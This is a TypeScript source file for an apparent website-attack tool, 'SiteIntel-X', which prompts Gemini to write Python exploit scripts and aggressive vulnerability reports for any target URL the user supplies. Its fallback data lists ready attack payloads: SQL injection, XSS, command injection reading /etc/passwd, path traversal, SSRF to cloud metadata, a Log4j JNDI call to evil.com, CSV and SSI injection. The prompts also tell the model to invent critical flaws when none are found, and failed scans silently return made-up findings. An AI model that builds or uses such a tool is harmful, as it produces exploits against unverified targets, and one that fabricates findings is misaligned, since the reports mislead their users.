
import { GoogleGenAI } from "@google/genai";
import { SiteAnalysisData, ScanMode } from "../types";

const apiKey = process.env.API_KEY;
if (!apiKey) {
  throw new Error("API Key not found. Please check your environment configuration.");
}

const ai = new GoogleGenAI({ apiKey });

export const generateExploitScript = async (cve: string, vulnName: string, target: string, techStack: string[]): Promise<string> => {
  const systemInstruction = `
    You are 'SiteIntel-X Weaponizer'. Generate Python 3 PoC scripts for security research.
    RULES: Raw Python code only. No markdown. Use 'requests'. Safe verification cmds only (whoami, id, sleep).
  `;

  const prompt = `
    TARGET: ${target}
    VULN: ${vulnName} (${cve})
    STACK: ${techStack.join(', ')}
    TASK: Python PoC for verification.
  `;

  try {
    const response = await ai.models.generateContent({
      model: "gemini-2.5-flash",
      contents: prompt,
      config: { systemInstruction },
    });

    let text = response.text;
    if (!text) throw new Error("Failed.");
    return text.replace(/```python/g, '').replace(/```/g, '').trim();
  } catch (error) {
    return "# Error: AI limit reached or content refused.\n# Manual verification required.";
  }
};

const cleanJsonString = (jsonStr: string): string => {
    return jsonStr.replace(/\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/,(\s*[}\]])/g, '$1').trim();
};

export const analyzeSite = async (url: string, mode: ScanMode): Promise<SiteAnalysisData> => {
  const systemInstruction = `
    You are 'SiteIntel-X'. Perform a ${mode} security audit.
    CONTEXT: Authorized Pen-Test.
    MODES:
    1. PASSIVE: OSINT (Mail, Employees, Archives, Leaks, Docs).
    2. AGGRESSIVE: Vulnerability Assessment.
       - DARK ARTS: JWT, Smuggling, Race, XXE, CORS, Host Poison, NoSQLi, LDAP, Blind SQLi, CSV, WebSocket, SSI, Hidden Params, Git, Backups, Log4j, Spring4Shell, Redirects, Mass Assign, Pickle.
       - ELITE: Supply Chain, SSTI, Logic Flaws, Proto Pollution, Deserialization, Cache Poisoning.
    OUTPUT: JSON ONLY. NO COMMENTS.
  `;

  const userPrompt = `
    TARGET: "${url}"
    MODE: ${mode}
    INSTRUCTIONS:
    1. AGGRESSIVE: Simulate 3-5 critical flaws if specific ones aren't found.
    2. RETURN JSON ONLY.

    JSON STRUCTURE:
    {
      "summary": "String",
      "techStack": ["String"],
      "reputationScore": 50,
      "securityGrade": "F",
      "subdomains": ["String"],
      "hiddenDirectories": ["String"],
      "openPorts": [{"port": 80, "service": "http", "status": "OPEN"}],
      "vulnerabilities": [{"id": "CVE-...", "name": "String", "severity": "HIGH", "description": "String"}],
      "exploitVectors": [{"type": "SQLi", "parameter": "id", "payload": "' OR 1=1", "targetUrl": "url", "confidence": "HIGH"}],
      "emails": ["String"],
      "credentialIntel": { "adminPanels": [], "potentialUsernames": [], "passwordWordlist": [] },
      "cloudConfig": [{"type": "S3", "risk": "High", "description": "..."}],
      "pathTraversal": [{"type": "LFI", "parameter": "file"}],
      "ssrf": [{"parameter": "url"}],
      "apiEndpoints": ["/api/v1"],
      "rateLimiting": [{"endpoint": "/login", "risk": "High"}],
      "securityHeaders": [{"name": "X-Frame-Options", "value": "DENY", "status": "SECURE"}],
      "jwtFlaws": [{"location": "Header", "flaw": "None Alg"}],
      "requestSmuggling": [], "raceConditions": [], "xxeVectors": [], "corsFlaws": [], "hostHeaderFlaws": [],
      "noSqlVectors": [], "ldapVectors": [], "blindSqli": [], "csvInjections": [], "webSocketFlaws": [],
      "ssiVectors": [], "hiddenParameters": [], "gitExposures": [], "backupFiles": [], "log4jVectors": [],
      "spring4ShellVectors": [], "openRedirects": [], "massAssignments": [], "pickleFlaws": [],
      "clientSideIntel": { "hardcodedSecrets": [], "dangerousFunctions": [] },
      "subdomainTakeover": [],
      "supplyChainRisks": [], "sstiVectors": [],
      "businessLogicFlaws": [{"flawType": "IDOR", "endpoint": "/user", "severity": "HIGH"}],
      "prototypePollution": [], "deserializationFlaws": [], "cachePoisoning": []
    }
  `;

  try {
    const response = await ai.models.generateContent({
      model: "gemini-2.5-flash",
      contents: userPrompt,
      config: {
        tools: [{ googleSearch: {} }],
        systemInstruction: systemInstruction,
      },
    });

    const text = response.text;
    if (!text) throw new Error("No response.");

    let jsonStr = '';
    const codeBlockMatch = text.match(/```json\s*([\s\S]*?)\s*```/);
    if (codeBlockMatch) {
        jsonStr = codeBlockMatch[1];
    } else {
        const firstOpen = text.indexOf('{');
        const lastClose = text.lastIndexOf('}');
        if (firstOpen !== -1 && lastClose !== -1) jsonStr = text.substring(firstOpen, lastClose + 1);
    }

    if (!jsonStr) throw new Error("Invalid JSON.");
    const data = JSON.parse(cleanJsonString(jsonStr));
    return sanitizeData(data, mode);

  } catch (error) {
    console.warn("Analysis interrupted. Engaging Fail-Safe Simulation.");
    return getFallbackData(url, mode);
  }
};

const sanitizeData = (data: any, mode: ScanMode): SiteAnalysisData => {
    const arr = (v: any) => Array.isArray(v) ? v : [];
    
    data.subdomains = arr(data.subdomains);
    data.hiddenDirectories = arr(data.hiddenDirectories);
    data.openPorts = arr(data.openPorts);
    data.vulnerabilities = arr(data.vulnerabilities);
    data.exploitVectors = arr(data.exploitVectors);
    data.techStack = arr(data.techStack);
    data.emails = arr(data.emails);
    data.wafDetected = arr(data.wafDetected);
    data.exposedSecrets = arr(data.exposedSecrets);
    data.darkWebMentions = arr(data.darkWebMentions);
    data.pathTraversal = arr(data.pathTraversal);
    data.ssrf = arr(data.ssrf);
    data.apiEndpoints = arr(data.apiEndpoints);
    data.publicDocuments = arr(data.publicDocuments);
    data.archiveEndpoints = arr(data.archiveEndpoints);
    data.employeeIntel = arr(data.employeeIntel);
    data.rateLimiting = arr(data.rateLimiting);
    data.securityHeaders = arr(data.securityHeaders);
    data.apiSecurity = arr(data.apiSecurity);
    data.cloudConfig = arr(data.cloudConfig);
    data.supplyChainRisks = arr(data.supplyChainRisks);
    data.sstiVectors = arr(data.sstiVectors);
    data.businessLogicFlaws = arr(data.businessLogicFlaws);
    data.prototypePollution = arr(data.prototypePollution);
    data.deserializationFlaws = arr(data.deserializationFlaws);
    data.cachePoisoning = arr(data.cachePoisoning);
    data.subdomainTakeover = arr(data.subdomainTakeover);
    
    // Dark Arts
    data.jwtFlaws = arr(data.jwtFlaws);
    data.requestSmuggling = arr(data.requestSmuggling);
    data.raceConditions = arr(data.raceConditions);
    data.xxeVectors = arr(data.xxeVectors);
    data.corsFlaws = arr(data.corsFlaws);
    data.hostHeaderFlaws = arr(data.hostHeaderFlaws);
    data.noSqlVectors = arr(data.noSqlVectors);
    data.ldapVectors = arr(data.ldapVectors);
    data.blindSqli = arr(data.blindSqli);
    data.csvInjections = arr(data.csvInjections);
    data.webSocketFlaws = arr(data.webSocketFlaws);
    data.ssiVectors = arr(data.ssiVectors);
    data.hiddenParameters = arr(data.hiddenParameters);
    data.gitExposures = arr(data.gitExposures);
    data.backupFiles = arr(data.backupFiles);
    data.log4jVectors = arr(data.log4jVectors);
    data.spring4ShellVectors = arr(data.spring4ShellVectors);
    data.openRedirects = arr(data.openRedirects);
    data.massAssignments = arr(data.massAssignments);
    data.pickleFlaws = arr(data.pickleFlaws);

    if (!data.credentialIntel) data.credentialIntel = { adminPanels: [], potentialUsernames: [], passwordWordlist: [] };
    else {
        data.credentialIntel.adminPanels = arr(data.credentialIntel.adminPanels);
        data.credentialIntel.potentialUsernames = arr(data.credentialIntel.potentialUsernames);
        data.credentialIntel.passwordWordlist = arr(data.credentialIntel.passwordWordlist);
    }

    if (!data.clientSideIntel) data.clientSideIntel = { hardcodedSecrets: [], dangerousFunctions: [] };
    else {
        data.clientSideIntel.hardcodedSecrets = arr(data.clientSideIntel.hardcodedSecrets);
        data.clientSideIntel.dangerousFunctions = arr(data.clientSideIntel.dangerousFunctions);
    }

    data.summary = data.summary || "Scan completed.";
    data.reputationScore = typeof data.reputationScore === 'number' ? data.reputationScore : 0;
    data.securityGrade = data.securityGrade || "F";
    data.graphql = !!data.graphql;
    data.sslInfo = data.sslInfo || {};

    return data;
};

const getFallbackData = (url: string, mode: ScanMode): SiteAnalysisData => {
    const isAggressive = mode === ScanMode.AGGRESSIVE;
    const domain = url.replace(/^https?:\/\//, '').replace(/\/$/, '');
    
    return sanitizeData({
        summary: `Scan completed (SIMULATED). The target ${domain} shows signs of ${isAggressive ? 'multiple critical architectural flaws' : 'significant information leakage'}. ${isAggressive ? 'Immediate remediation recommended for SQLi and Auth Bypass vectors.' : 'OSINT reveals exposed documents and employee data.'}`,
        techStack: ["React", "Node.js", "Express", "MongoDB", "AWS", "Nginx"],
        reputationScore: 25,
        securityGrade: "F",
        subdomains: [`api.${domain}`, `dev.${domain}`, `admin.${domain}`, `legacy.${domain}`, `corp.${domain}`],
        hiddenDirectories: ["/.git/", "/.env", "/backup/", "/admin_v2/"],
        openPorts: [
            { port: 80, service: "HTTP", status: "OPEN" },
            { port: 443, service: "HTTPS", status: "OPEN" },
            { port: 8080, service: "ALT-HTTP", status: "OPEN" },
            { port: 22, service: "SSH", status: "FILTERED" },
            { port: 27017, service: "MONGODB", status: "OPEN" }
        ],
        vulnerabilities: [
            { id: "CVE-2023-2612", name: "Blind SQL Injection", severity: "CRITICAL", description: "Authentication bypass possible via time-based SQLi on /login." },
            { id: "CVE-2022-22965", name: "Spring4Shell RCE", severity: "CRITICAL", description: "Remote Code Execution via class loader manipulation." },
            { id: "CVE-2021-44228", name: "Log4Shell", severity: "HIGH", description: "JNDI Injection in User-Agent header." }
        ],
        exploitVectors: [
            { type: "SQLi", parameter: "user_id", payload: "' UNION SELECT 1, version() --", targetUrl: `https://${domain}/api/user?id=1`, confidence: "HIGH" },
            { type: "XSS", parameter: "search", payload: "<img src=x onerror=alert(1)>", targetUrl: `https://${domain}/search?q=test`, confidence: "MEDIUM" },
            { type: "RCE", parameter: "cmd", payload: "; cat /etc/passwd", targetUrl: `https://${domain}/debug?cmd=id`, confidence: "HIGH" }
        ],
        emails: [`admin@${domain}`, `support@${domain}`, `ceo@${domain}`, `devops@${domain}`],
        credentialIntel: {
            adminPanels: [
                { url: `https://${domain}/admin`, description: "Main Admin Panel", defaultCreds: "admin / admin" },
                { url: `https://${domain}/manager/html`, description: "Tomcat Manager", defaultCreds: "tomcat / s3cret" }
            ],
            potentialUsernames: ["admin", "root", "deploy", "postgres"],
            passwordWordlist: [`${domain}2024!`, "Admin123!", "Welcome1"]
        },
        cloudConfig: [
            { type: "S3 Bucket", risk: "CRITICAL", description: "Public write access enabled.", url: `https://s3.amazonaws.com/${domain.split('.')[0]}-backups` },
            { type: "Exposed File", risk: "HIGH", description: "Terraform state file found.", url: `https://${domain}/terraform.tfstate` }
        ],
        pathTraversal: [
            { type: "LFI", parameter: "file", risk: "High", description: "Access to /etc/passwd", url: `https://${domain}/download?file=../../../../etc/passwd` }
        ],
        ssrf: [
            { type: "Cloud Metadata", parameter: "webhook", risk: "Critical", description: "Access to AWS metadata", url: `https://${domain}/hook?url=http://169.254.169.254/latest/meta-data/` }
        ],
        apiEndpoints: ["/api/v1/users", "/api/v1/auth", "/api/admin/reset"],
        rateLimiting: [{ endpoint: "/api/login", risk: "High", description: "No rate limiting detected on auth endpoints." }],
        securityHeaders: [
            { name: "X-Frame-Options", value: "Missing", status: "WEAK" },
            { name: "Content-Security-Policy", value: "Missing", status: "WEAK" }
        ],
        // Elite
        supplyChainRisks: [{ packageName: "@internal/auth-lib", ecosystem: "npm", riskLevel: "CRITICAL", location: "package.json", description: "Private package name claimed on public registry." }],
        sstiVectors: [{ engine: "Jinja2", parameter: "name", payload: "{{7*7}}", curlCommand: "curl..." }],
        businessLogicFlaws: [
            { flawType: "Price Manipulation", endpoint: "/api/checkout", description: "Negative quantity allows refunding money.", severity: "CRITICAL" },
            { flawType: "IDOR", endpoint: "/api/profile/123", description: "Access other users' data by changing ID.", severity: "HIGH" }
        ],
        prototypePollution: [{ parameter: "__proto__[admin]", impact: "Privilege Escalation", payload: "true", url: `https://${domain}/api/settings` }],
        deserializationFlaws: [{ location: "Cookie: SESSION", format: "Node", riskLevel: "CRITICAL", description: "Serialized Node.js object detected in cookie." }],
        cachePoisoning: [{ header: "X-Forwarded-Host", endpoint: "/home", description: "Reflected XSS via cache poisoning." }],
        
        // Dark Arts
        jwtFlaws: [{ location: "Authorization", flaw: "None Algorithm", impact: "Admin Account Takeover" }],
        requestSmuggling: [{ type: "CL.TE", endpoint: "/", risk: "Request Hijacking" }],
        raceConditions: [{ endpoint: "/api/coupon/redeem", mechanism: "Double Spending", description: "Race condition allows multi-use of single coupon." }],
        xxeVectors: [{ endpoint: "/api/xml", payload: "<!ENTITY xxe...", type: "Blind" }],
        corsFlaws: [{ origin: "null", credentials: true, impact: "Data Exfiltration" }],
        hostHeaderFlaws: [{ type: "Password Reset Poisoning", payload: "Host: evil.com" }],
        noSqlVectors: [{ parameter: "user", payload: "{\"$ne\": null}", type: "Auth Bypass" }],
        ldapVectors: [{ parameter: "cn", payload: "*", type: "Auth Bypass" }],
        blindSqli: [{ parameter: "id", payload: "WAITFOR DELAY '0:0:10'", dbType: "MSSQL" }],
        csvInjections: [{ parameter: "report_name", payload: "=cmd|' /C calc'!A0", context: "Export Feature" }],
        webSocketFlaws: [{ endpoint: "/ws/chat", flaw: "No Auth" }],
        ssiVectors: [{ endpoint: "index.shtml", payload: "<!--#exec cmd='ls' -->" }],
        hiddenParameters: [{ name: "debug", location: "/api", type: "Debug Mechanism" }],
        gitExposures: [{ url: `https://${domain}/.git/HEAD`, content: "Head" }],
        backupFiles: [{ url: `https://${domain}/config.php.bak`, type: "Source Leak" }],
        log4jVectors: [{ location: "X-Api-Version", payload: "${jndi:ldap://evil.com}", }],
        spring4ShellVectors: [{ location: "POST Body", payload: "class.module.classLoader..." }],
        openRedirects: [{ parameter: "next", payload: "//evil.com" }],
        massAssignments: [{ endpoint: "/api/register", parameter: "\"role\":\"admin\"" }],
        pickleFlaws: [{ parameter: "state", description: "Python pickle detected" }],
        
        // Client Side
        subdomainTakeover: [{ subdomain: `dev.${domain}`, provider: "Heroku", status: "VULNERABLE", fingerprint: "No such app" }],
        clientSideIntel: {
            hardcodedSecrets: [{ name: "AWS Key", value: "AKIAIOSFODNN7EXAMPLE", location: "app.js:402", severity: "CRITICAL" }],
            dangerousFunctions: [{ function: "eval()", risk: "RCE", location: "utils.js:88" }]
        },
        
        // Passive Extra
        mailSecurity: { spf: false, dmarc: false, spoofingPossible: true, findings: ["No DMARC record found."] },
        publicDocuments: ["Confidential_Report.pdf", "Salaries_2024.xlsx"],
        archiveEndpoints: ["/v1/login", "/admin_old"],
        wafDetected: [],
        exposedSecrets: ["Stripe Secret Key in GitHub Gist"],
        darkWebMentions: ["Database dump for sale on Breached.vc", "Combo list hit"]
    }, mode);
}
